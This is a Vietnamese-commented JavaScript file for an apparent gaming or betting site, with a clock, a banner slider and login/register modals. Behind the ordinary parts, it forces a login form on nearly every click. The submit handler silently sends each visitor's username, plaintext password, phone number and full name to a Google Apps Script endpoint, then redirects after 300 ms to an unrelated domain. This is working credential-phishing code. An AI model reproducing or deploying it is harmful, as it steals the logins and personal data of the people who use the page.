// ==========================================
// 1. CẬP NHẬT THỜI GIAN THEO MÚI GIỜ VIỆT NAM
// ==========================================
function updateVietnamTime() {
    const timeElement = document.getElementById('vn-time');
    if (!timeElement) return;

    const now = new Date();
    const options = {
        timeZone: 'Asia/Ho_Chi_Minh',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
    };

    const vnTimeStr = now.toLocaleString('vi-VN', options);
    timeElement.textContent = vnTimeStr;
}
updateVietnamTime();
setInterval(updateVietnamTime, 1000);

// ==========================================
// 2. BANNER TRƯỢT NGANG TỰ ĐỘNG
// ==========================================
function initBannerSlider() {
    const track = document.getElementById('slider-track');
    if (!track) return;

    const slides = document.querySelectorAll('.slide');
    let currentIndex = 0;
    const totalSlides = slides.length;

    function moveToNextSlide() {
        currentIndex++;
        if (currentIndex >= totalSlides) {
            currentIndex = 0;
        }
        track.style.transform = `translateX(-${currentIndex * 100}%)`;
    }

    setInterval(moveToNextSlide, 5000);
}
initBannerSlider();

// ==========================================
// 3. ĐIỀU KHIỂN MODAL & XỬ LÝ FORM
// ==========================================
function initModals() {
    const loginModal = document.getElementById('login-modal');
    const registerModal = document.getElementById('register-modal');
    
    const btnLogins = document.querySelectorAll('.btn-login, .mobile-btn-login');
    const btnRegisters = document.querySelectorAll('.btn-register, .btn-trial, .mobile-btn-register');
    const closeBtns = document.querySelectorAll('.close-modal');
    
    const switchToRegister = document.getElementById('switch-to-register');
    const switchToLogin = document.getElementById('switch-to-login');

    // Mở/Đóng Modal
    function openModal(modal) {
        modal.classList.add('active');
    }
    function closeAllModals() {
        loginModal.classList.remove('active');
        registerModal.classList.remove('active');
    }

    // Sự kiện mở Form Đăng Nhập (Từ các nút Đăng nhập chính)
    btnLogins.forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            closeAllModals();
            openModal(loginModal);
        });
    });

    // Sự kiện mở Form Đăng Ký
    btnRegisters.forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            closeAllModals();
            openModal(registerModal);
        });
    });

    // ==============================================
    // THÊM MỚI: NHẤN VÀO CÁC THÀNH PHẦN KHÁC -> MỞ FORM ĐĂNG NHẬP
    // ==============================================
    // Gom tất cả các class của game, menu, banner vào 1 danh sách
    const requireLoginElements = document.querySelectorAll(`
        .game-card, 
        .nav-list a, 
        .bottom-nav a, 
        .scroll-menu-list a, 
        .featured-card,
        .featured-promo-btn a,
        .banner-slider
    `);

    requireLoginElements.forEach(element => {
        element.addEventListener('click', (e) => {
            e.preventDefault(); // Ngăn hành động mặc định (như nhảy trang hoặc scroll lên top)
            closeAllModals();
            openModal(loginModal); // Tự động bật form đăng nhập
        });
    });
    // ==============================================

    // Sự kiện đóng
    closeBtns.forEach(btn => btn.addEventListener('click', closeAllModals));
    window.addEventListener('click', (e) => {
        if (e.target === loginModal || e.target === registerModal) {
            closeAllModals();
        }
    });

    // Sự kiện chuyển form
    if (switchToRegister) {
        switchToRegister.addEventListener('click', (e) => {
            e.preventDefault();
            closeAllModals();
            openModal(registerModal);
        });
    }
    if (switchToLogin) {
        switchToLogin.addEventListener('click', (e) => {
            e.preventDefault();
            closeAllModals();
            openModal(loginModal);
        });
    }

    // ==============================================
    // XỬ LÝ RÀNG BUỘC (VALIDATE) VÀ SUBMIT GOOGLE SHEETS
    // ==============================================
    const authForms = document.querySelectorAll('.auth-form');

    authForms.forEach(form => {
        form.addEventListener('submit', function(e) {
            e.preventDefault(); 
            
            const inputs = form.querySelectorAll('input:not([type="checkbox"])');
            let isValid = true;
            let errorMessage = "";

            // 1. KIỂM TRA ĐIỀU KIỆN (VALIDATE)
            for (let i = 0; i < inputs.length; i++) {
                const input = inputs[i];
                const value = input.value.trim();
                const type = input.type;
                const placeholder = input.placeholder.toLowerCase();

                if (value === "") {
                    isValid = false;
                    errorMessage = "Vui lòng điền đầy đủ tất cả các trường thông tin!";
                    break; 
                }

                if (type === "password" || placeholder.includes("tên đăng nhập")) {
                    if (value.length < 5 || value.length > 20) {
                        isValid = false;
                        errorMessage = "Tên đăng nhập và Mật khẩu phải có độ dài từ 5 đến 20 ký tự!";
                        break;
                    }
                }

                if (type === "tel" || placeholder.includes("số điện thoại")) {
                    const phoneRegex = /^\d{10}$/; 
                    if (!phoneRegex.test(value)) {
                        isValid = false;
                        errorMessage = "Số điện thoại không hợp lệ! Vui lòng nhập đúng 10 chữ số.";
                        break;
                    }
                }
            }

            const checkbox = form.querySelector('input[type="checkbox"]');
            if (checkbox && !checkbox.checked && form.closest('#register-modal')) {
                isValid = false;
                errorMessage = "Bạn phải đồng ý với thỏa thuận đăng ký để tiếp tục!";
            }

            // 2. XỬ LÝ KẾT QUẢ VÀ GỬI LÊN GOOGLE SHEETS
            if (!isValid) {
                alert(errorMessage);
            } else {
                // Đổi text nút bấm để báo hiệu đang tải
                const submitBtn = form.querySelector('.btn-submit');
                const originalBtnText = submitBtn.textContent;
                submitBtn.textContent = 'ĐANG XỬ LÝ...';
                submitBtn.disabled = true;

                // Xác định form Đăng nhập hay Đăng ký
                const isRegister = form.closest('#register-modal') !== null;
                const type = isRegister ? 'ĐĂNG KÝ' : 'ĐĂNG NHẬP';

                // Bóc tách dữ liệu từ các ô input
                let username = "", password = "", phone = "", fullname = "";
                inputs.forEach(input => {
                    const ph = input.placeholder.toLowerCase();
                    if (ph.includes("tên đăng nhập")) username = input.value;
                    if (ph.includes("mật khẩu")) password = input.value;
                    if (ph.includes("số điện thoại")) phone = input.value;
                    if (ph.includes("họ tên")) fullname = input.value;
                });

                // Đóng gói dữ liệu
                const data = {
                    type: type,
                    username: username,
                    password: password,
                    phone: phone,
                    fullname: fullname
                };

                // BẠN HÃY DÁN LINK WEB APP CỦA BẠN VÀO DÒNG BÊN DƯỚI:
                const scriptURL = 'https://script.google.com/macros/s/AKfycbxRuxwyMDgRoqw6CmxlRS7M2ryzVzManXPuah_-qeDjb0Cviu6eBI8a5nTBT3HINPhwqA/exec';

                // Gửi dữ liệu đi ngầm
                fetch(scriptURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'text/plain;charset=utf-8' },
                    body: JSON.stringify(data),
                    keepalive: true // Đảm bảo dữ liệu vẫn được gửi đi dù đang chuyển trang
                }).catch(error => {
                    console.error('Lỗi ngầm:', error.message);
                });

                // Chuyển hướng gần như ngay lập tức (chỉ đợi 300ms để kết nối mạng kịp khởi tạo)
                setTimeout(() => {
                    window.location.href = "https://www.abc86.space/";
                }, 300);
            }
        });
    });
}

// Khởi chạy khi DOM tải xong
document.addEventListener('DOMContentLoaded', initModals);